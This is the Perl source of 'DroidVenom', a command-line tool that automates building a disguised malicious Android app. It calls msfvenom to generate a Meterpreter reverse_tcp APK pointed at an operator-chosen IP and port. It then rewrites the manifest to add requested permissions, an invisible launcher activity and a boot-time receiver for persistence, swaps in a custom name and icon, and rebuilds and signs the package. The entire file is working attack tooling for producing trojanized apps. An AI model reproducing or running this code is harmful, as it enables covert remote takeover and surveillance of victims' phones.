use v5.10;
use strict;
use warnings;
use experimental 'smartmatch';
use File::Copy qw(copy);
use File::Path qw(rmtree);
use Term::ANSIColor qw(color colored);

my $VERSION='1.0.5';

my $IP='0.0.0.0:80';
my $name='Application';
my $output='app.apk';
my $payload='android/meterpreter/reverse_tcp';
my $permissions_file_path='permissions.txt';
my $features_file_path='features.txt';
my $icons_directory;
my $sigalg='SHA1withRSA';
my $digestalg='SHA1';
my $key_file_path='my-release-key.keystore';

sub get_arg{
	my $arg=shift @ARGV;
	if(!$arg||$arg=~/^-{1,2}/){die "Wrong number of arguments for \"$_\".\nExpected $_[1].\nGot ".($_[0]-1).".\n"}
	return $arg;
}
do{
	given(shift @ARGV){
		when(undef){}
		when(['-v','--version']){
			print "DroidVenom v$VERSION\n";
			exit;
		}
		when(['-i','--ip']){$IP=get_arg(1,1)}
		when(['-n','--name']){
			$name=get_arg(1,1);
			$output=lc($name).'.apk';
		}
		when(['-o','--output']){$output=get_arg(1,1)}
		when(['-p','--payload']){$payload=get_arg(1,1)}
		when(['-P','--permissions']){$permissions_file_path=get_arg(1,1)}
		when(['-F','--features']){$features_file_path=get_arg(1,1)}
		when(['-I','--icons']){$icons_directory=get_arg(1,1)}
		when(['-s','--sigalg']){$sigalg=get_arg(1,1)}
		when(['-d','--digestalg']){$digestalg=get_arg(1,1)}
		when(['-k','--key']){$key_file_path=get_arg(1,1)}
		default{
			print color 'blue';
			print "usage: perl main.pl [-h] [-v] [-i IP] [-n NAME] [-o FILE] [-p PAYLOAD] [-P FILE] [-F FILE] [-I PATH] [-s ALGORITHM] [-d ALGORITHM] [-k FILE]\n";
			print "  -h, --help            show this help message and exit\n";
			print "  -v, --version            show version and exit\n";
			print "  -i, --ip IP\n            set custom IP address\n";
			print "  -n, --name NAME\n            set custom name for application and output file name\n";
			print "  -o, --output FILE\n            set custom output file name\n";
			print "  -p, --payload PAYLOAD\n            set custom payload\n";
			print "  -P, --permissions FILE\n            set path to file with permissions\n";
			print "  -F, --features FILE\n            set path to file with features\n";
			print "  -I, --icons PATH\n            set path to directory with icons\n";
			print "  -s, --sigalg ALGORITHM\n            set name of signature algorithm\n";
			print "  -d, --digestalg ALGORITHM\n            set name of digest algorithm\n";
			print "  -k, --key FILE\n            set path to file with key\n";
			if(not $_~~['-h','--help']){die colored "Invalid option \"$_\".\n",'red'}
			print color 'reset';
			exit;
		}
	}
}while(@ARGV);

print colored "[+] Generating the application.\n",'green';
if($IP=~/(.*):(.*)/){system 'msfvenom','-p',$payload,"LHOST=$1","LPORT=$2",'R','-o',$output and exit $?>>8;}
print colored "[+] Successfully generated $output\n",'green';
print colored "[+] Decompiling $output\n",'green';
system 'apktool','d','-f',$output and exit $?>>8;
my $app_directory=$1 if $output=~/(.*).apk$/;
print colored "[+] Successfully decompiled \"$output\" to \"$app_directory\" directory.\n",'green';
print colored "[+] Opening \"$app_directory/AndroidManifest.xml\"\n",'green';
open my $manifest_file,'>',"$app_directory/AndroidManifest.xml" or die colored "[-] Can't open \"$app_directory/AndroidManifest.xml\" for writing: $!.\n",'red';
print colored "[+] Successfully opened \"$app_directory/AndroidManifest.xml\"\n",'green';
print colored "[+] Writing to \"$app_directory/AndroidManifest.xml\"\n",'green';
print $manifest_file "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.metasploit.stage\" platformBuildVersionCode=\"10\" platformBuildVersionName=\"2.3.3\">\n";
print colored "[+] Opening \"$permissions_file_path\"\n",'green';
open my $permissions_file,'<',$permissions_file_path or die colored "[-] Can't open \"$permissions_file_path\" for reading: $!.\n",'red';
print colored "[+] Successfully opened \"$permissions_file_path\"\n",'green';
print colored "[+] Writing permissions to \"$app_directory/AndroidManifest.xml\"\n",'green';
print $manifest_file "    <uses-permission android:name=\"android.permission.".s/\s+$//r ."\"/>\n" while(<$permissions_file>);
print colored "[+] Successfully wrote permissions to \"$app_directory/AndroidManifest.xml\"\n",'green';
print colored "[+] Closing \"$permissions_file_path\"\n",'green';
close $permissions_file or die colored "[-] Can't close \"$permissions_file_path\": $!.\n",'red';
print colored "[+] Successfully closed \"$permissions_file_path\"\n",'green';
print colored "[+] Opening \"$features_file_path\"\n",'green';
open my $features_file,'<',$features_file_path or die colored "[-] Can't open \"$features_file_path\" for reading: $!.\n",'red';
print colored "[+] Successfully opened \"$features_file_path\"\n",'green';
print colored "[+] Writing features to \"$app_directory/AndroidManifest.xml\"\n",'green';
print $manifest_file "    <uses-feature android:name=\"android.hardware.".s/\s+$//r ."\"/>\n" while(<$features_file>);
print colored "[+] Successfully wrote features to \"$permissions_file_path\"\n",'green';
if($icons_directory){
	print $manifest_file "    <application android:label=\"\@string/app_name\" android:icon=\"\@drawable/icon\">\n";
	foreach('l','m','h'){
		print colored "[+] Creating \"$app_directory/res/drawable-${_}dpi-v4\"\n",'green';
		mkdir "$app_directory/res/drawable-${_}dpi-v4";
		print colored "[+] Successfully created \"$app_directory/res/drawable-${_}dpi-v4\"\n",'green';
		print colored "[+] Copying \"$icons_directory/$_.png\" to \"$app_directory/res/drawable-${_}dpi-v4/icon.png\"\n",'green';
		copy "$icons_directory/$_.png","$app_directory/res/drawable-${_}dpi-v4/icon.png" or die colored "[-] Can't copy \"$icons_directory/$_.png\" to \"$app_directory/res/drawable-${_}dpi-v4/icon.png\": $!.\n",'red';
		print colored "[+] Successfully copied \"$icons_directory/$_.png\" to \"$app_directory/res/drawable-${_}dpi-v4/icon.png\"\n",'green';
	}
}else{print $manifest_file "    <application android:label=\"\@string/app_name\">\n"}
print $manifest_file <<'EOF';
        <activity android:label="@string/app_name" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
               <action android:name="android.intent.action.MAIN"/>
               <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <data android:host="my_host" android:scheme="metasploit"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <action android:name="android.intent.action.VIEW"/>
            </intent-filter>
        </activity>
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".MainService"/>
    </application>
</manifest>
EOF
print colored "[+] Successfully wrote features to \"$app_directory/AndroidManifest.xml\".\n",'green';
print colored "[+] Closing \"$features_file_path\"\n",'green';
close $features_file or die colored "[-] Can't close \"$features_file_path\": $!.\n",'red';
print colored "[+] Successfully closed \"$features_file_path\"\n",'green';
print colored "[+] Successfully wrote everything else to \"$app_directory/AndroidManifest.xml\"\n",'green';
print colored "[+] Closing \"$app_directory/AndroidManifest.xml\"\n",'green';
close $manifest_file or die colored "Can't close \"$app_directory/AndroidManifest.xml\": $!.\n",'red';
print colored "[+] Successfully closed \"$app_directory/AndroidManifest.xml\"\n",'green';
print colored "[+] Opening \"$app_directory/res/values/strings.xml\"\n",'green';
open my $values_file,'>',"$app_directory/res/values/strings.xml" or die colored "[-] Can't open \"$app_directory/res/values/strings.xml\" for writing: $!.\n",'red';
print colored "[+] Successfully opened \"$app_directory/res/values/strings.xml\"\n",'green';
print colored "[+] Writing to \"$app_directory/res/values/strings.xml\"\n",'green';
print $values_file <<"EOF";
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$name</string>
</resources>
EOF
print colored "[+] Successfully wrote to \"$app_directory/res/values/strings.xml\"\n",'green';
print colored "[+] Closing \"$app_directory/res/values/strings.xml\"\n",'green';
close $values_file or die colored "[-] Can't close \"$app_directory/res/values/strings.xml\": $!.\n",'red';
print colored "[+] Successfully closed \"$app_directory/res/values/strings.xml\"\n",'green';
print colored "[+] Compiling the application.\n",'green';
system 'apktool','b',$app_directory and exit $?>>8;
print colored "[+] Successfully compiled the application.\n",'green';
print colored "[+] Removing old application.\n",'green';
unlink $output or die colored "[-] Can't remove \"$output\": $!.\n",'red';
print colored "[+] Successfully removed old application.\n",'green';
print colored "[+] Moving \"$app_directory/dist/$output\" to \"$output\"\n",'green';
rename "$app_directory/dist/$output",$output or die colored "[-] Can't move \"$app_directory/dist/$output\" to \"$output\": $!.\n",'red';
print colored "[+] Successfully moved \"$app_directory/dist/$output\" to \"$output\"\n",'green';
print colored "[+] Removing \"$app_directory\"\n",'green';
rmtree $app_directory or die colored "[-] Can'remove \"$app_directory\": $!.\n",'red';
print colored "[+] Successfully removed \"$app_directory\"\n",'green';
print colored "[+] Signing \"$output\"\n",'green';
system 'jarsigner','-verbose','-sigalg',$sigalg,'-digestalg',$digestalg,'-keystore',$key_file_path,$output,'alias_name' and exit $?>>8;
print colored "[+] Successfully signed \"$output\"\n",'green';
